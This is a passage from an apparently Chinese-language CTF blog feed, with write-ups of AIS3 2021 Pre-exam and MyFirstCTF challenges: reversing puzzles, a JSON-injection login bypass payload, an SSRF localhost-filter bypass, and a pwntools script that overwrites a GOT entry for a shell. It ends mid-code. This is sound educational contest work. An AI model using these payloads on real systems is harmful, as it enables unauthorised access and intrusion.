<span class="token operator">=</span> <span class="token keyword">new</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>    <span class="token punctuation">{</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">14</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> list2 <span class="token operator">=</span> <span class="token keyword">new</span> List<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>    <span class="token punctuation">{</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>notes<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">!=</span> list2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><p>我們可以拿到 <code>list</code> 和 <code>list2</code><br>然後他會去 check <code> this.notes[]</code><br>可以看到想求出 <code>this.notes[i]</code> 的話只要把 <code>(list[i] + list2[i]) / 2</code> 就可以了<br>會得到答案的 index <code>{7,7,10,10,11,11,10,9,9,3,3,8,8,7}</code><br>把得到的 index 值去對應到 <code>dll檔</code> 內每一個按鍵對應的值，按鋼琴鍵就會跳出 flag 了 (是升調的小星星哦<span class="github-emoji"><span>😂</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>)<br><img src="https://i.imgur.com/glKJkAU.png" alt="twinkle"></p><blockquote><p>flag <code>AIS3{7wink1e_tw1nkl3_l1ttl3_574r_1n_C_5h4rp}</code></p></blockquote><h3 id="rabbit-Peekora-cucumber"><a href="#rabbit-Peekora-cucumber" class="headerlink" title=":rabbit: Peekora :cucumber:"></a><span class="github-emoji"><span>🐰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f430.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> Peekora <span class="github-emoji"><span>🥒</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f952.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h3><blockquote><p>吃太甜要配什麼<br>可樂<br>因為 too 甜配 cola<br>Usage: python3 -m pickle flag_checker.pkl<br>Author: splitline</p></blockquote><p>題目給了<code>.pkl檔</code>和它的用法 <code>python3 -m pickle flag_checker.pkl</code></p><div class="spoiler collapsed">    <div class="spoiler-title">        flag_checker.pkl    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp">c__builtin__<span class="token function">input</span><span class="token punctuation">(</span>S<span class="token string">'FLAG: '</span>tRp00c__builtin__getattrp1<span class="token function">0g1</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c__builtin__exitc__builtin__strlS<span class="token string">'__getitem__'</span>tRp2<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'startswith'</span><span class="token function">tR</span><span class="token punctuation">(</span>S<span class="token string">'AIS3{'</span><span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'endswith'</span><span class="token function">tR</span><span class="token punctuation">(</span>S<span class="token string">'}'</span><span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I6tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>VA<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I9tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vj<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I9tRp3<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I11tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vp<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I14tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>g3<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I1tRp4<span class="token function">0g2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I5tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vd<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I10tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vz<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I12tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vh<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g4S<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I13<span class="token function">tRtRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I8tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vw<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I7tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vm<span class="token function">tRtR</span><span class="token punctuation">(</span>tRc__builtin__<span class="token function">print</span><span class="token punctuation">(</span>S<span class="token string">'Correct!'</span>tR<span class="token punctuation">.</span></code></pre>    </div></div><p>跑跑看後會需要輸入 flag ，正確的話會跑出 <code>correct!</code></p><blockquote><p>tmi：看這題的時候是第三天早上三點多，不太能思考所以去排版，排起來不是很好看 w 就將就一下吧 XD</p></blockquote><p>打開<code>pkl檔</code>，用<a href="https://github.com/google/google-ctf/blob/master/third_party/edk2/AppPkg/Applications/Python/Python-2.7.2/Lib/pickle.py">pickle opcodes</a>看，先把<code>t</code>換成 <code>)</code> 然後去排版</p><div class="spoiler collapsed">    <div class="spoiler-title">        稍微排版後    </div>    <div class="spoiler-content">        <pre class=" language-cpp="><code class="language-cpp=">c__builtin__input(S'FLAG: ')Rp00c__builtin__getattrp10g1(    (c__builtin__    exit    c__builtin__    s)R    lS'__getitem__')Rp20g2(g1    (g0        S'startswith')R    (S'AIS3{')R)R()Rg2(g1    (g0    S'endswith'    )R    (S'}'    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  6        )R        S'__eq__'    )R    (V  A    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  9        )R        S'__eq__'    )R    (V  j    )R)R()Rg1(g0S'__getitem__')R(I  9)Rp30g2(g1    (g1        (g0        S'__getitem__'        )R        (I11        )R        S'__eq__'    )R    (Vp    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  14        )R        S'__eq__'    )R    (g3    )R)R()Rg1(g0S'__getitem__')R(I  1)Rp40g2(g1    (g1        (g0        S'__getitem__'        )R        (I  5        )R        S'__eq__'    )R    (V  d    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  10        )R        S'__eq__'    )R    (V  z    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  12        )R        S'__eq__'    )R    (V  h    )R)R()Rg2(g1    (g4    S'__eq__'    )R    (g1        (g0        S'__getitem__'        )R        (I  13        )R    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  8        )R        S'__eq__'        )R        (V  w    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  7        )R        S'__eq__'    )R    (V  m    )R)R()Rc__builtin__print(S'Correct!')R.</code></pre>    </div></div><p>這裡著重的點在<code>__getitem__</code>和<code>__eq__</code><br>從<a href="https://github.com/google/google-ctf/blob/master/third_party/edk2/AppPkg/Applications/Python/Python-2.7.2/Lib/pickle.py">Pickle opcodes</a>寫到</p><pre class=" language-bash"><code class="language-bash">GET <span class="token operator">=</span> <span class="token string">'g'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is string arg</span>INT <span class="token operator">=</span> <span class="token string">'I'</span>   <span class="token comment" spellcheck="true"># push integer or bool; decimal string argument</span>UNICODE <span class="token operator">=</span> <span class="token string">'V'</span>   <span class="token comment" spellcheck="true"># push Unicode string; raw-unicode-escaped'd argument</span></code></pre><p>所以猜是用 stack 的方式去跑，<code>getitem</code>會取 <code>"I"</code> 後面的值 push 進來 stack 裡面，碰到 <code>eq</code> 就會把 V 的值跟 stack 頂端的 index 值做比較，錯誤就結束，所以從最上面開始模擬一次 stack 就可以得到 flag 了</p><div class="spoiler collapsed">    <div class="spoiler-title">        stack    </div>    <div class="spoiler-content">        <pre class=" language-cpp="><code class="language-cpp=">get 6eq 'A'get9eq'j'get9get11eq'p'get14eqget1get5eq'd'get10eq'z'get12eq'h'eqget13get8eq'w'get7eq'm'</code></pre>    </div></div><p>按照 stack 的模式就可以推出 index 對應到的字元了!<br><img src="https://i.imgur.com/m1XC8eB.png"><br>送進去測試之後就會跳出 <code>Correct!</code></p><blockquote><p>flag <code>AIS3{dAmwjzphIj}</code></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ⲩⲉⲧ-ⲁⲛⲟⲧⲏⲉs-𝓵ⲟ𝓰ⲓⲛ-ⲣⲁ𝓰ⲉ"><a href="#ⲩⲉⲧ-ⲁⲛⲟⲧⲏⲉs-𝓵ⲟ𝓰ⲓⲛ-ⲣⲁ𝓰ⲉ" class="headerlink" title="ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ"></a>ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ</h3><p>點開網址後可以看到是一個登入畫面 <img src="https://i.imgur.com/84ofW1R.png" alt="Login"><br>下面有給我們 Source Code <img src="https://i.imgur.com/piuni5f.png" alt="Sauce"></p><p>一開始就亂丟亂試都沒成功，於是花了點時間來看 Source<br>運用<code>JS</code>的特性，<code>users_db</code>的<code>dict</code>如果去取一個不存在的東西會拿到<code>None</code><br>跟<code>null</code>進行 <strong>弱比較</strong> 會是<code>False</code><br>所以可以把<code>password</code>設成<code>null</code><br>再加上<code>JSON</code>後面的會覆蓋掉前面的<br>所以前面塞一些東西，然後<code>password</code>後面再塞一些東西去閉合掉前後的<code>"</code><br>只要保證最後一次<code>username</code>不在<code>users_db</code>內、<code>password</code>是<code>null</code>、<code>showflag</code>是<code>true</code>就可以了</p><p><strong>Payload</strong></p><pre class=" language-js"><code class="language-js">admin<span class="token string">","</span>showflag<span class="token string">":true,"</span>username<span class="token string">":"</span>qqqq<span class="token string">","</span>password<span class="token string">":null,"</span>username<span class="token string">":"</span>aaa</code></pre><blockquote><p>flag <code>AIS3{/r/badUIbattles?!?!}</code></p></blockquote><h3 id="HaaS"><a href="#HaaS" class="headerlink" title="HaaS"></a>HaaS</h3><p>一開始點進去網址看會發現<code>Method Not Allowed</code> <img src="https://i.imgur.com/c5eT2md.png"><br>把<code>/haas</code>拔掉之後就會出現<code>HealthCheck as a Service</code>的網頁 <img src="https://i.imgur.com/Ncu5iH7.png"><br>直接按下送出後會出現<code>Error</code> <img src="https://i.imgur.com/2fB5kXC.png"><br>嘗試改掉<code>status</code>後發現會跳出<code>alive</code> <img src="https://i.imgur.com/q9er00X.png"><br>接著就被卡住了，後來想說是不是之前打CTF的時候出現的<code>SSRF</code>，就去輸入<code>localhost 127.0.0.1</code>，於是跳出了 <img src="https://i.imgur.com/mQf2cPY.png"><br>既然他把我擋掉了，那應該代表要<code>Bypass</code><br>上網查之後查到了<a href="https://ithelp.ithome.com.tw/articles/10242449">用句號代替逗號的方法</a><br><img src="https://i.imgur.com/cWZCnXr.png" alt="ByPass"></p><p>但是直接輸入也不行，又被卡住了<br>後來想說打開<code>BurpSuite</code>能不能看到更多東西<br>所以去研究了一下<a href="https://www.hackercat.org/burp-suite-tutorial/web-pentesting-burp-suite-total-tutorial">BurpSuite的教學文章</a><br>送了幾次網址後在<code>Proxy</code>那邊複製他的格式然後把最底下的 url 改成<code>http://127。0。0。1</code> urlencode後的字串，就可以得到flag了<br><img src="https://i.imgur.com/nZZwUD4.png" alt="Burp"></p><blockquote><p>flag <code>AIS3{V3rY_v3rY_V3ry_345Y_55rF}</code></p></blockquote><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Write-Me-192-賽後"><a href="#Write-Me-192-賽後" class="headerlink" title="Write Me (192) (賽後)"></a>Write Me (192) (賽後)</h3><blockquote><p>Author: lys0829</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目：gotplt.c    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>systemgot <span class="token operator">=</span> <span class="token number">0x404028</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>scanfgot <span class="token operator">=</span> <span class="token number">0x404040</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//void *systemgot = (void *)((long long)(*(int *)(systemptr+2))+(long long)(systemptr+6));</span>   <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>systemgot <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Address: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> v<span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>v<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>scanfgot <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OK! Shell for you :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><p>從題目可以看到會在前面把 <code>*systemgot</code> 設為 <code>0x0</code><br>呼叫 <code>system()</code>的時候會跳到 <code>*systemgot</code>執行，因為前面位址被改掉所以會噴錯<br>執行程式會讓你輸入 <code>unsigned long long *address</code> , <code>unsigned long long value</code><br>接著把 <code>*address = value</code><br>我們的目標是把 <code>*systemgot</code> 改回原本的值<br>因此用 <code>gdb</code> 去查看就可以找到了<br><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token comment" spellcheck="true">#r = process('./gotplt')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'quiz.ais3.org'</span><span class="token punctuation">,</span> <span class="token number">10102</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># x/1x 0x404028 ->0x00401050</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x404028</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4210728'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x401050</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4198480'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Epilogue"><a href="#Epilogue" class="headerlink" title="Epilogue"></a>Epilogue</h2><p>第一次比賽還是很緊張的<br>再加上第一天有 MFC ，第二天有 T 貓決賽<br>於是第二天晚上就果斷不睡稱到比賽結束<br>在結束前十幾分鐘才解出 peekora，真的超刺激<br>Pre-exam 還是挺好玩的！！<br>有任何問題歡迎和我討論~~</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AIS3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 MyFirstCTF write-up</title>
      <link href="/2021/05/22/2021-MyFirstCTF-write-up/"/>
      <url>/2021/05/22/2021-MyFirstCTF-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/05/22 09:30 - 17:30</td></tr><tr><td>Rank</td><td>11/282</td></tr><tr><td>Score</td><td>1362</td></tr></tbody></table><h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>這是我初次參加(好像也只能參加一次) MyFirstCTF，為期 8 小時。<br>題目會與接續的 AIS3 Pre-exam 些微重疊(因為 AIS3 Pre-exam 的第一天是 MFC~)</p><p>我的排名是第 11 名 ，雖然解的題目不多，對當時的我來說是個還滿滿意的成績~<br>因為是 PR90 以上所以當時有領到獎狀和 AIS3 的帽子 <span class="github-emoji"><span>😍</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><br><img src="https://i.imgur.com/DVqZFWL.jpg" alt="mfc rank"></p><p>事不遲疑，直接進到 write-up 吧</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi"><a href="#Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi" class="headerlink" title="Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi"></a>Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi</h3><blockquote><p>BGM: <a href="https://youtu.be/9-NusuQ8JaA">亜咲花「I believe what you said」</a><br>TERM=xterm-256color ssh -p 5566 <a href="mailto:h173@quiz.ais3.org">h173@quiz.ais3.org</a><br>Author: splitline feat. Hojo Satoko</p></blockquote><p>Welcome 題</p><p><code>TERM=xterm-256color ssh -p 5566 h173@quiz.ais3.org</code><br>連線後會跳轉到輸入數字密碼的介面，只要按錯一個就會跳 Locked，要重新連線<br>暴力嘗試即可<br>密碼 2025830455298</p><blockquote><p>flag <code>AIS3{H1n4m1z4w4_Sh0k0gun}</code></p></blockquote><blockquote><p>HINT 附上了<a href="https://youtu.be/2b3Oqo13-r0?t=1296">影片</a></p></blockquote><h3 id="祝賀-新垣結衣新婚快樂-發錢囉"><a href="#祝賀-新垣結衣新婚快樂-發錢囉" class="headerlink" title="[祝賀] 新垣結衣新婚快樂 發錢囉"></a>[祝賀] 新垣結衣新婚快樂 發錢囉</h3><p><img src="https://i.imgur.com/6olvo2O.png" alt="題目檔案"><br>下載後觀察到是 png ， <code>foremost</code> 可以看到裡面有 zip檔案<br>需要密碼 但 zip cracker 沒辦法找到<br>猜測是 zip 偽加密，下載 editor 更改後就可以得到 flag 的圖片<br>左邊為原檔 右邊為更改後<br><img src="https://i.imgur.com/Fzu7t14.jpg"><br><img src="https://i.imgur.com/6RiHOwZ.jpg" alt="flag"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Microchip"><a href="#Microchip" class="headerlink" title="Microchip"></a>Microchip</h3><div class="spoiler collapsed">    <div class="spoiler-title">        題目如下    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"python.h"</span></span>def <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"4444"</span>                                                      <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"333"</span>                                                       <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"22"</span>                                                        <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"1"</span>    keys <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> id    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        keys<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>temp <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>temp <span class="token operator">/</span> <span class="token number">96</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>padded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">:</span>   #<span class="token number">10</span> round        nums <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token 